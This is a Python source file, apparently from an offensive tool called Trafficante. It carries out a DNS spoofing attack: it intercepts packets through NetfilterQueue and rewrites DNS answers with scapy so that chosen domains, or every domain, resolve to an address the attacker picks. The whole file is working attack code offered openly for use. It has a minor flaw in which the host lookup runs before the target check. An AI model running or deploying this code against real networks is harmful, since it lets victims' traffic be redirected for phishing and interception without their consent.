# github.com/n0nexist/Trafficante

from scapy.all import *
import modules.utils as utils
from netfilterqueue import NetfilterQueue
import json

dns_hosts = {}
allwebsitesflag = False
redirect_to = ""

def process_packet(packet):
    """ processes captured packets """
    
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except Exception:
            pass
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(packet):
    """ modifies dns packets """
    
    global dns_hosts
    global allwebsitesflag
    global redirect_to

    qname = packet[DNSQR].qname
    spoofto = dns_hosts[qname]
    if qname not in dns_hosts and (not allwebsitesflag):
        print(f"{utils.colors.BLUE}ignoring {qname} (not on target list){utils.colors.RESET}")
        return packet
    if allwebsitesflag:
        spoofto = redirect_to
    print(f"{utils.colors.GREEN}spoofing {qname} to {utils.colors.BLUE}{utils.colors.ITALIC}{spoofto}{utils.colors.RESET}")
    packet[DNS].an = DNSRR(rrname=qname, rdata=spoofto)
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


def load_targetlist(filename):
    """ loads the filename into the target's list """
    
    global dns_hosts
    with open(filename, 'r') as f:
        content = json.load(f)
    print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} loading {utils.colors.WARNING}{len(content.items())}{utils.colors.RESET}{utils.colors.GREEN}{utils.colors.ITALIC} targets from {filename}{utils.colors.RESET}")
    dns_hosts = {k.encode('utf-8'): v for k, v in content.items()}
    

def start_spoofing(recordsfile):
    """ starts spoofing dns reponses """

    global allwebsitesflag
    global redirect_to

    allwebsitesflag = recordsfile.startswith("all_")

    try:
        print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} starting dns spoofing attack{utils.colors.RESET}")
        if not allwebsitesflag:
            load_targetlist(recordsfile)
        else:
            redirect_to = recordsfile.split("all_")[1]
            print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} redirecting all dns requests to {utils.colors.WARNING}{redirect_to}{utils.colors.RESET}")
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except Exception as e:
        print(f"{utils.colors.FAIL}!{utils.colors.ITALIC} {e}{utils.colors.RESET}")
        pass  
        